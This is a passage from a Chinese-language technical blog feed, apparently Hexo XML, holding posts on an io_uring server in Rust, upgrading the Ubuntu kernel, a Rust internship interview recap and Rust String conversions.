结构体,fd 表示监听的文件描述符,token 表示 sqe 携带的用户数据</span></span><br><span class="line">    <span class="comment">/// count 表示该文件描述符所能接收到的最大连接</span></span><br><span class="line">    <span class="function"><span class="keyword">fn</span> <span class="title">new</span></span>(fd: RawFd, token: <span class="built_in">usize</span>, count: <span class="built_in">usize</span>) -&gt; <span class="keyword">Self</span> &#123;</span><br><span class="line">        <span class="keyword">Self</span> &#123;</span><br><span class="line">            entry: opcode::Accept::new(types::Fd(fd), ptr::null_mut(), ptr::null_mut())</span><br><span class="line">                    .build()</span><br><span class="line">                    .user_data(token <span class="keyword">as</span> _),</span><br><span class="line">            count</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 向提交队列中提交事件</span></span><br><span class="line">    <span class="keyword">pub</span> <span class="function"><span class="keyword">fn</span> <span class="title">push_to</span></span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>, sq: &amp;<span class="keyword">mut</span> SubmissionQueue&lt;<span class="symbol">&#x27;_</span>&gt;) &#123;</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">self</span>.count &gt; <span class="number">0</span> &#123;</span><br><span class="line">            <span class="keyword">unsafe</span>&#123;</span><br><span class="line">                <span class="keyword">match</span> sq.push(&amp;<span class="keyword">self</span>.entry) &#123;</span><br><span class="line">                    <span class="literal">Ok</span>(_) =&gt; <span class="keyword">self</span>.count -= <span class="number">1</span>,</span><br><span class="line">                    <span class="literal">Err</span>(_) =&gt; <span class="keyword">break</span>,</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sq.sync();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ring = IoUring::new(<span class="number">256</span>).unwrap();</span><br><span class="line">    <span class="keyword">let</span> listener = TcpListener::bind((<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8080</span>)).unwrap();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用于存放提交失败的事件</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> backlog = VecDeque::new();</span><br><span class="line">    <span class="comment">// 用于存放空闲的缓冲区的 buf_index,一般为关闭连接的socket被回收的</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> bufpool = <span class="built_in">Vec</span>::with_capacity(<span class="number">64</span>);</span><br><span class="line">    <span class="comment">// 用来存储内存中的缓冲区的指针，使用 buf_index 进行访问</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> buf_alloc = Slab::with_capacity(<span class="number">64</span>);</span><br><span class="line">    <span class="comment">// 一段用来存放不同事件token的内存区域，通过token_index获取到事件类型及信息</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> token_alloc = Slab::with_capacity(<span class="number">64</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用来存放所有建立连接的 sockets</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> sockets = <span class="built_in">Vec</span>::new();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Server listen on &#123;&#125;&quot;</span>, listener.local_addr().unwrap());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从 io_uring 实例中获取提交者,提交队列，完成队列</span></span><br><span class="line">    <span class="keyword">let</span> (submitter, <span class="keyword">mut</span> sq, <span class="keyword">mut</span> cq) = ring.split();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 建立 AcceptCount，用于计算监听的文件描述符并提交事件</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> accept = AcceptCount::new(listener.as_raw_fd(), token_alloc.insert(Token::Accept), <span class="number">10</span>);</span><br><span class="line">    accept.push_to(&amp;<span class="keyword">mut</span> sq); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="comment">// 提交SQ里的所有队列，等待至少一个事件成功返回</span></span><br><span class="line">        <span class="keyword">match</span> submitter.submit_and_wait(<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="literal">Ok</span>(_) =&gt; (),</span><br><span class="line">            <span class="literal">Err</span>(<span class="keyword">ref</span> err) =&gt; <span class="keyword">if</span> err.raw_os_error() == <span class="literal">Some</span>(libc::EBUSY) &#123; <span class="keyword">break</span>; &#125;,</span><br><span class="line">            <span class="literal">Err</span>(err) =&gt; <span class="built_in">panic!</span>(err)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 同步完成队列，刷新在内核中的CQEs</span></span><br><span class="line">        cq.sync();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">loop</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> sq.is_full() &#123;</span><br><span class="line">                <span class="comment">// 提交队列满了的时候提交所有任务到内核</span></span><br><span class="line">                <span class="keyword">match</span> submitter.submit() &#123;</span><br><span class="line">                    <span class="literal">Ok</span>(_) =&gt; (),</span><br><span class="line">                    <span class="literal">Err</span>(<span class="keyword">ref</span> err) =&gt; <span class="keyword">if</span> err.raw_os_error() == <span class="literal">Some</span>(libc::EBUSY) &#123;<span class="keyword">break</span>;&#125;,</span><br><span class="line">                    <span class="literal">Err</span>(err) =&gt; <span class="built_in">panic!</span>(err)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 同步提交队列的内容</span></span><br><span class="line">            sq.sync();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">match</span> backlog.pop_front() &#123;</span><br><span class="line">                <span class="literal">Some</span>(sqe) =&gt; <span class="keyword">unsafe</span> &#123;</span><br><span class="line">                    <span class="comment">// 向SQ中提交事件（此时没有被提交到内核中）</span></span><br><span class="line">                    <span class="keyword">let</span> _ = sq.push(&amp;sqe);</span><br><span class="line">                &#125;,</span><br><span class="line"></span><br><span class="line">                <span class="literal">None</span> =&gt; <span class="keyword">break</span>,</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        accept.push_to(&amp;<span class="keyword">mut</span> sq);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> cqe <span class="keyword">in</span> &amp;<span class="keyword">mut</span> cq &#123;</span><br><span class="line">            <span class="comment">// 遍历完成队列的内容</span></span><br><span class="line">            <span class="comment">// 获取 CQE 的结果</span></span><br><span class="line">            <span class="keyword">let</span> ret = cqe.result();</span><br><span class="line">            <span class="comment">// 获取 CQE 的用户数据（用于判断是什么事件）</span></span><br><span class="line">            <span class="keyword">let</span> token_index = cqe.user_data() <span class="keyword">as</span> <span class="built_in">usize</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ret &lt; <span class="number">0</span>  &#123;</span><br><span class="line">                <span class="comment">// 表明该事件执行失败了</span></span><br><span class="line">                eprintln!(</span><br><span class="line">                    <span class="string">&quot;token &#123;:?&#125; error: &#123;:?&#125;&quot;</span>,</span><br><span class="line">                    token_alloc.get(token_index),</span><br><span class="line">                    io::Error::from_raw_os_error(-ret)</span><br><span class="line">                );</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 通过传入的用户数据取出对应的 token 用于判断是什么事件</span></span><br><span class="line">            <span class="keyword">let</span> token = &amp;<span class="keyword">mut</span> token_alloc[token_index];</span><br><span class="line">            <span class="keyword">match</span> token.clone() &#123;</span><br><span class="line">                Token::Accept =&gt; &#123;</span><br><span class="line">                    <span class="comment">// 当接收到客户端连接时，将 accept 的 count 域进行迭代</span></span><br><span class="line">                    accept.count += <span class="number">1</span>;</span><br><span class="line">                    <span class="comment">// 此时收到的结果是一个文件描述符，表示的是接收到连接的socket</span></span><br><span class="line">                    <span class="keyword">let</span> fd = ret;</span><br><span class="line">                    <span class="comment">// 将文件描述符push到sockets中</span></span><br><span class="line">                    sockets.push(fd);</span><br><span class="line">                    <span class="comment">// 此时向分配 token_alloc 中插入Token获取token用于作为 user_data</span></span><br><span class="line">                    <span class="keyword">let</span> poll_token = token_alloc.insert(Token::Poll&#123; fd &#125;);</span><br><span class="line">                    <span class="comment">// 创建poll实例，不断轮询检测是否从该socket中收到信息</span></span><br><span class="line">                    <span class="keyword">let</span> poll_e = opcode::PollAdd::new(types::Fd(fd), libc::POLLIN <span class="keyword">as</span> _)</span><br><span class="line">                                        .build()</span><br><span class="line">                                        .user_data(poll_token <span class="keyword">as</span> _);</span><br><span class="line">                    <span class="keyword">unsafe</span>&#123;</span><br><span class="line">                        <span class="keyword">if</span> sq.push(&amp;poll_e).is_err() &#123;</span><br><span class="line">                            <span class="comment">// 如果没有提交到提交队列中(此时应当是提交队列已满)，则将其放入backlog中，等待下一次提交</span></span><br><span class="line">                            backlog.push_back(poll_e);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Token::Poll &#123; fd &#125; =&gt; &#123;</span><br><span class="line">                    <span class="keyword">let</span> (buf_index, buf) = <span class="keyword">match</span> bufpool.pop() &#123;</span><br><span class="line">                        <span class="literal">Some</span>(buf_index) =&gt; (buf_index, &amp;<span class="keyword">mut</span> buf_alloc[buf_index]),</span><br><span class="line">                        <span class="literal">None</span> =&gt; &#123;</span><br><span class="line">                            <span class="comment">// 新建一个缓冲区</span></span><br><span class="line">                            <span class="keyword">let</span> buf = <span class="built_in">vec!</span>[<span class="number">0u8</span>; <span class="number">2048</span>].into_boxed_slice();</span><br><span class="line">                            <span class="comment">// 返回一个空条目的 handle,允许进一步进行操作</span></span><br><span class="line">                            <span class="keyword">let</span> buf_entry = buf_alloc.vacant_entry();</span><br><span class="line">                            <span class="comment">// 获取该 handle 的key(index)</span></span><br><span class="line">                            <span class="keyword">let</span> buf_index = buf_entry.key();</span><br><span class="line">                            <span class="comment">// 返回索引和将缓冲区插入 entry中</span></span><br><span class="line">                            (buf_index, buf_entry.insert(buf))</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;;</span><br><span class="line"></span><br><span class="line">                    *token = Token::Read &#123; fd, buf_index &#125;;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 当 Poll 事件返回后表明有一个可读事件发生，此时应当注册读取事件，并将</span></span><br><span class="line">                    <span class="comment">// 该事件 push 到提交队列中</span></span><br><span class="line">                    <span class="keyword">let</span> read_e = opcode::Recv::new(types::Fd(fd), buf.as_mut_ptr(), buf.len() <span class="keyword">as</span> _)</span><br><span class="line">                                        .build()</span><br><span class="line">                                        .user_data(token_index <span class="keyword">as</span> _);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">unsafe</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> sq.push(&amp;read_e).is_err() &#123;</span><br><span class="line">                            backlog.push_back(read_e);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Token::Read &#123; fd, buf_index&#125; =&gt; &#123;</span><br><span class="line">                    <span class="comment">// 读取事件返回，表明从连接的socket中读取到了传输来的信息</span></span><br><span class="line">                    <span class="keyword">if</span> ret == <span class="number">0</span> &#123;</span><br><span class="line">                        <span class="comment">// 结果为0,表明对方关闭了连接</span></span><br><span class="line">                        <span class="comment">// 此时这个缓冲区就没有用了，将其push</span></span><br><span class="line">                        <span class="comment">// 到 bufpool,用于下一次read/write事件</span></span><br><span class="line">                        <span class="comment">// 作为缓冲区</span></span><br><span class="line">                        bufpool.push(buf_index);</span><br><span class="line">                        <span class="comment">// 将token_index从token_alloc移除掉</span></span><br><span class="line">                        token_alloc.remove(token_index);</span><br><span class="line"></span><br><span class="line">                        <span class="built_in">println!</span>(<span class="string">&quot;shutdown&quot;</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span>..sockets.len() &#123;</span><br><span class="line">                            <span class="keyword">if</span> sockets[i] == fd &#123;</span><br><span class="line">                                sockets.remove(i);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">unsafe</span> &#123;</span><br><span class="line">                            libc::close(fd);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">// 读取成功，此时的结果表明读取的字节数</span></span><br><span class="line">                        <span class="keyword">let</span> len = ret <span class="keyword">as</span> <span class="built_in">usize</span>;</span><br><span class="line">                        <span class="comment">// 获取用来获取 read 的缓冲区</span></span><br><span class="line">                        <span class="keyword">let</span> buf = &amp;buf_alloc[buf_index];</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">let</span> socket_len = sockets.len();</span><br><span class="line">                        token_alloc.remove(token_index);</span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span>..socket_len &#123;</span><br><span class="line">                            <span class="comment">// 新建write_token并将其传输给所有正在连接的socket</span></span><br><span class="line">                            <span class="keyword">let</span> write_token = Token::Write &#123;</span><br><span class="line">                                fd: sockets[i], </span><br><span class="line">                                buf_index,</span><br><span class="line">                                len,</span><br><span class="line">                                offset: <span class="number">0</span></span><br><span class="line">                            &#125;;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">let</span> write_token_index = token_alloc.insert(write_token);</span><br><span class="line"></span><br><span class="line">                            <span class="comment">// 注册 write 事件，实际上是注册 send syscall 的事件</span></span><br><span class="line">                            <span class="keyword">let</span> write_e = opcode::<span class="built_in">Send</span>::new(types::Fd(sockets[i]), buf.as_ptr(), len <span class="keyword">as</span> _)</span><br><span class="line">                                                .build()</span><br><span class="line">                                                .user_data(write_token_index <span class="keyword">as</span> _);</span><br><span class="line">                            <span class="keyword">unsafe</span> &#123;</span><br><span class="line">                                <span class="keyword">if</span> sq.push(&amp;write_e).is_err() &#123;</span><br><span class="line">                                    backlog.push_back(write_e);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Token::Write &#123;</span><br><span class="line">                    fd,</span><br><span class="line">                    buf_index,</span><br><span class="line">                    offset,</span><br><span class="line">                    len</span><br><span class="line">                &#125; =&gt; &#123;</span><br><span class="line">                    <span class="comment">// write(send) 事件返回，此时的结果是写字节数</span></span><br><span class="line">                    <span class="keyword">let</span> write_len = ret <span class="keyword">as</span> <span class="built_in">usize</span>; </span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 如果写偏移量的写数据的字节数大于等于要写的长度，</span></span><br><span class="line">                    <span class="comment">// 此时表明已经写完，则开始注册等待事件继续轮询socket是否传输信息</span></span><br><span class="line">                    <span class="keyword">let</span> entry = <span class="keyword">if</span> offset + write_len &gt;= len &#123;</span><br><span class="line">                        bufpool.push(buf_index);</span><br><span class="line"></span><br><span class="line">                        *token = Token::Poll &#123; fd &#125;;</span><br><span class="line"></span><br><span class="line">                        opcode::PollAdd::new(types::Fd(fd), libc::POLLIN <span class="keyword">as</span> _)</span><br><span class="line">                                .build()</span><br><span class="line">                                .user_data(token_index <span class="keyword">as</span> _)</span><br><span class="line">                    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">// 如果没写完的话则更新参数重新写</span></span><br><span class="line">                        <span class="comment">// 将写偏移量加上写字节数</span></span><br><span class="line">                        <span class="keyword">let</span> offset = offset + write_len;</span><br><span class="line">                        <span class="comment">// 将要写的数据长度减去偏移量</span></span><br><span class="line">                        <span class="keyword">let</span> len = len - offset;</span><br><span class="line">                        <span class="comment">// 通过偏移量获取缓冲区的指针</span></span><br><span class="line">                        <span class="keyword">let</span> buf = &amp;buf_alloc[buf_index][offset..];</span><br><span class="line"></span><br><span class="line">                        *token = Token::Write &#123;</span><br><span class="line">                            fd, </span><br><span class="line">                            buf_index,</span><br><span class="line">                            offset, </span><br><span class="line">                            len</span><br><span class="line">                        &#125;;</span><br><span class="line"></span><br><span class="line">                        opcode::Write::new(types::Fd(fd), buf.as_ptr(), len <span class="keyword">as</span> _)</span><br><span class="line">                                    .build()</span><br><span class="line">                                    .user_data(token_index <span class="keyword">as</span> _)</span><br><span class="line">                    &#125;;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">unsafe</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> sq.push(&amp;entry).is_err() &#123;</span><br><span class="line">                            <span class="comment">// 将事件push到提交队列中，失败了则放入到备份中</span></span><br><span class="line">                            backlog.push_back(entry);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="引用"><a class="markdownIt-Anchor" href="#引用"></a> 引用</h2>
<ul>
<li>
<p><a href="https://kernel.dk/io_uring.pdf">Efficient IO with io_uring</a></p>
</li>
<li>
<p><a href="https://en.wikipedia.org/wiki/Vectored_I/O">Vectored I/O</a></p>
</li>
<li>
<p><a href="https://github.com/tokio-rs/io-uring">tokio-rs/io-uring</a></p>
</li>
<li>
<p>Advanced Programming the UNIX Environment</p>
</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>操作系统</tag>
        <tag>异步IO</tag>
      </tags>
  </entry>
  <entry>
    <title>在Ubuntu中升级Linux内核</title>
    <url>/2021/10/27/%E5%9C%A8Ubuntu%E4%B8%AD%E5%8D%87%E7%BA%A7Linux%E5%86%85%E6%A0%B8/</url>
    <content><![CDATA[<p>为了使用 Linux 中的 <code>io_uring</code> 特性，我将 Ubuntu 18.04 中的内核进行升级。</p>
<p>首先访问 <a href="https://kernel.ubuntu.com/~kernel-ppa/mainline/">Ubuntu内核网址</a> 然后选择我们需要升级的 linux 内核版本，在这里我们选择最新的稳定的 linux 内核的版本，然后进入网页：，可以看到如下页面：</p>
<p><img src="/2021/10/27/%E5%9C%A8Ubuntu%E4%B8%AD%E5%8D%87%E7%BA%A7Linux%E5%86%85%E6%A0%B8/linux5.14.png" alt></p>
<p>注意到 linux 内核分为通用版和低延迟版，这里我们选择通用版进行安装,执行一下命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.14/amd64/linux-headers-5.14.0-051400-generic_5.14.0-051400.202108292331_amd64.deb</span><br><span class="line">wget https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.14/amd64/linux-headers-5.14.0-051400_5.14.0-051400.202108292331_all.deb</span><br><span class="line">wget https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.14/amd64/linux-image-unsigned-5.14.0-051400-generic_5.14.0-051400.202108292331_amd64.deb</span><br><span class="line">wget https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.14/amd64/linux-modules-5.14.0-051400-generic_5.14.0-051400.202108292331_amd64.deb</span><br></pre></td></tr></table></figure>
<p>随后进入下载的目录，执行以下命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo dpkg -i *.deb</span><br></pre></td></tr></table></figure>
<p>执行成功后重启：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure>
<p>当进入之后使用 <code>uname -sr</code> 查看内核版本，查看是否为安装的内核版本</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>飞书Rust实习面试</title>
    <url>/2021/10/22/%E9%A3%9E%E4%B9%A6Rust%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95/</url>
    <content><![CDATA[<h2 id="一面"><a class="markdownIt-Anchor" href="#一面"></a> 一面</h2>
<p>首先聊项目，主要让我讲了讲我 <code>xv6-rust</code> 的项目，然后讲到我用 <code>Buddy System Allocator</code> 替换了 <code>xv6-riscv</code> 的内存分配算法的时候，他问了我关于 <code>Buddy System</code> 算法相关的内容，我说伙伴内存分配算法使用多个链表和位图维护，然后举了个例子，说如果想去分配 512 bytes 的内存但是512 bytes 的链表为空，则去 1024 bytes 去找，如果 1024 bytes 的链表也为空，则向 2048 bytes 去找，找到了的话就把其分成两个 1024 bytes 的内存块，其中一块加入 1024 bytes 的链表中，另一块分为两块 512 bytes 的，一块供程序使用，另一块加入链表中，并更新位图。当回收时更新位图，并判断是否存在连续内存可以合并。</p>
<p>之后面试官问我伙伴内存系统解决了什么问题，我说可以有效减少内存碎片，然后他问伙伴内存分配算法真的可以完全解决吗，我说应该不可以，然后他说为啥不可以，我想了会没说上来，然后他说比如 513 bytes 这种，我说这种可以 2 的幂次对齐进行分配（但当时我记错了，我应该说 <code>slab</code> 的）,之后又问我知道什么算法可以解决内存碎片，当时没想起来，其实应该是 <code>slab</code> 的2333。</p>
<p>之后我又开始讲了锁的设计，说我使用 Rust 实现的相比于 <code>xv6-riscv</code> 可以完全实现 <code>RAII</code>,然后他问我为什么可以实现 <code>RAII</code>，我说使用了 <code>Drop</code> trait，之后问我关于 <code>spinlock</code> 和 <code>sleeplock</code> 的区别，我说 <code>spinlock</code> 需要自旋，一直占用 CPU 的时间，所以一般是多进程/线程 访问内存的中的数据时，占用时间不长使用的，而 <code>sleeplock</code> 则是一般做 IO 这种需要较长时间的，这段时间需要把 CPU 调度出去运行其他线程，等到 IO 结束后唤醒并调度回来这个线程。</p>
<p>之后我又介绍了一下我的进程调度和文件系统的设计，然后他问我 buffer 和 cache 的区别（比较奇怪），我说 buffer 一般是软件来做的，用在内存里，cache 一般是体系结构里的东西，一般从磁盘取出来的东西要放在 cache 里做缓存，当发现脏数据的时候需要写回磁盘中，但感觉没答到点上。</p>
<p>之后又说了说我 <code>rCore-fat</code> 的项目，然后问了问我 <code>fat32</code> 文件系统的结构，然后问了我如何计算 <code>fat32</code> 能够存储文件的最大容量。之后又问了问我知不知道其它文件系统，我说了 <code>ext2</code> 和 <code>ext4</code>，并表示细节并不清楚。</p>
<p>之后开始问关于 Rust 内容了，首先问我 <code>trait</code> 和 <code>dyn trait</code> 的区别是啥，我说一个是动态派发一个是静态派发。然后问我它们在编译时和运行时有啥区别，我说静态派发一般是固定类型大小的，而动态派发在运行时是有一个 <code>vtable</code> 维护的，编译时不需要知道大小是多少，再往深了问就不知道了(</p>
<p>之后开始问了我 Rust 的智能指针(<code>Box</code>,<code>Vec</code>, <code>RC</code>, <code>Arc</code>, <code>RefCell</code>, <code>Cell</code>, <code>UnsafeCell</code>)</p>
<p>最后问了我三次握手和四次挥手的问题，之前做计网 proj 仔细看过 RFC 793,答得很好。</p>
<p>然后就是一道简单的二分搜索算法题。</p>
<p>一面结束。</p>
<h2 id="二面"><a class="markdownIt-Anchor" href="#二面"></a> 二面</h2>
<p>5分钟后开始二面。</p>
<p>同样是开始介绍我的项目，问的问题和一面也差不多，略过不说了。</p>
<p>然后开始问我关于 Rust 的内容，问了 <code>Deref</code>, <code>Drop</code>, <code>Copy</code>, <code>Any</code> 几个 trait, <code>Any</code> 没答上来，没用过（,</p>
<p>然后问我 <code>Send</code>, <code>Sync</code> 的问题，都答上来了。</p>
<p>之后问我 <code>trait</code> 和 <code>trait object</code> 的问题，和一面说的差不多。</p>
<p>之后问我如果想在函数调用前和调用后都打印消息应该怎么做，我说过程宏，他说应该怎么写，我说我不会过程宏(雾)。</p>
<p>之后问我 <code>Box&lt;dyn(Fn() + Send + 'static)&gt;</code> 的表达式的意思，我说是做并发用的，‘static 是静态生命周期，因为在多线程的时候很可能主线程结束了，多线程仍然在跑，没有 'static 的话生命周期会随着主线程 drop， <code>Send</code> 是用来标记可以把其所有权传递到线程中，<code>Fn()</code> 表示用 &amp;self 当做参数，<code>dyn</code> 是因为在编译期不知道大小，需要动态派发，<code>Box</code> 是用来包裹 <code>dyn</code> 生成的胖指针的。</p>
<p>之后问了我关于  分页和分段的问题，我说分段是 Intel 8086 为了扩大寻址空间干的事，因为当时只有16位寻址空间，但是地址总线有20位，于是搞了个段表，每次从段表里取基址左移然后再加上实际的地址。分页是操作系统为了管理内存，并且让多个程序有一种独占地址空间的错觉，更便于进行管理，后面说了一对细节巴拉巴拉…</p>
<p>然后是一道链表的算法题，面试官让我用熟悉的语言写，可能是考虑到 Rust 写比较困难，但我还是用 Rust 写的，最后写出来了，虽然复杂度不咋地。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Rust</tag>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>Rust并发安全总结</title>
    <url>/2021/10/19/Rust%E5%B9%B6%E5%8F%91%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Rust</tag>
        <tag>并发</tag>
      </tags>
  </entry>
  <entry>
    <title>Rust String 用法总结</title>
    <url>/2021/10/19/Rust-String/</url>
    <content><![CDATA[<ul>
<li>String + String -&gt; String:</li>
</ul>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s1 = <span class="string">&quot;0&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> s2 = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> s = <span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>, s1, s2);</span><br></pre></td></tr></table></figure>
<ul>
<li>String + &amp;str -&gt; String:</li>
</ul>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s1: &amp;<span class="built_in">str</span>;</span><br><span class="line"><span class="keyword">let</span> s: <span class="built_in">String</span>;</span><br><span class="line">s.push_str(s1);</span><br></pre></td></tr></table></figure>
<ul>
<li>&amp;str + &amp;str -&gt; String:</li>
</ul>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s1: &amp;<span class="built_in">str</span>;</span><br><span class="line"><span class="keyword">let</span> s2: &amp;<span class="built_in">str</span>;</span><br><span class="line"><span class="keyword">let</span> s = <span class="built_in">String</span>::from_str(s1);</span><br><span class="line">s.push_str(s2);</span><br></pre></td></tr></table></figure>
<ul>
<li>String -&gt; &amp;str:</li>
</ul>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s: <span class="built_in">String</span>;</span><br><span class="line"><span class="keyword">let</span> s1: &amp;<span class="built_in">str</span> = s.as_str();</span><br><span class="line"><span class="keyword">let</span> s2: &amp;<span class="keyword">mut</span> <span class="built_in">str</span> = s.as_mut_str();</span><br></pre></td></tr></table></figure>
<ul>
<li>String -&gt; &amp;[u8]:</li>
</ul>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s: <span class="built_in">String</span>;</span><br><span class="line"><span class="keyword">let</span> s1: &amp;[<span class="built_in">u8</span>] = s.as_bytes();</span><br></pre></td></tr></table></figure>
<ul>
<li>String -&gt; &amp;mut Vec&lt; u8 &gt;</li>
</ul>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s: <span class="built_in">String</span></span><br><span class="line"><span class="keyword">let</span> s1: &amp;<span class="keyword">mut</span> <span class="built_in">Vec</span>&lt;<span class="built_in">u8</span>&gt; = s.as_mut_vec();</span><br></pre></td></tr></table></figure>
<ul>
<li>&amp;str -&gt; String:</li>
</ul>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s: &amp;<span class="built_in">str</span>;</span><br><span class="line"><span class="keyword">let</span> s1 = <span class="built_in">String</span>::from_str(s);</span><br></pre></td></tr></table></figure>
<ul>
<li>&amp;[u8] -&gt; String:</li>
</ul>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s: &amp;[<span class="built_in">u8</span>];</span><br><span class="line"><span class="keyword">let</span> s1 = <span class="built_in">String</span>::from_utf8_lossy(s);</span><br><span class="line"><span class="keyword">let</span> s2 = <span class="built_in">String</span>::from_utf8(s.to_vec()).unwrap();</span><br></pre></td></tr></table></figure>
<ul>
<li>Vec&lt; u8 &gt; -&gt; String:</li>
</ul>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s: <span class="built_in">Vec</span>&lt;<span class="built_in">u8</span>&gt;;</span><br><span class="line"><span class="keyword">let</span> s1 = <span class="built_in">String</span>::from_utf8(s).unwrap();</span><br></pre></td></tr></table></figure>
<ul>
<li>通过索引获取 String 中的 字符</li>
</ul>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s: <span class="built_in">String</span>;</span><br><span class="line"><span class="keyword">let</span> c = s.chars().nth(index).unwrap();</span><br></pre></td></tr></table></figure>
<ul>
<li>遍历 String</li>
</ul>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s: <span class="built_in">String</span>;</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> s.chars() &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Rust</tag>
      </tags>
  </entry>
  <entry>
    <title>6.824 Lab2 Leader Election</title>
    <url>/2021/10/16/6-824-Lab2A/</url>
